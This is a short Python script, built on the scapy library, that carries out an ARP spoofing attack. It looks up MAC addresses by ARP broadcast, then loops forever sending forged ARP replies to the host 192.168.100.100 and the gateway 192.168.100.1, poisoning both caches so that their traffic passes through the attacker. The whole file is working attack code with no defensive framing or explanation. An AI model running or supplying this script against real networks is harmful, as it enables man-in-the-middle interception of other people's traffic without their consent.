#!usr/bin/env python
import scapy.all as scapy
import time

def getMac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast/arpRequest
    
    answered = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]

    print(answered)
    
    return answered[0][1].hwsrc

def spoof(targetIP, spoofIP):
    targetMac = getMac(targetIP)
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=spoofIP)
    scapy.send(packet)
    
while True:
    spoof("192.168.100.100", "192.168.100.1")
    spoof("192.168.100.1", "192.168.100.100")
    time.sleep(1)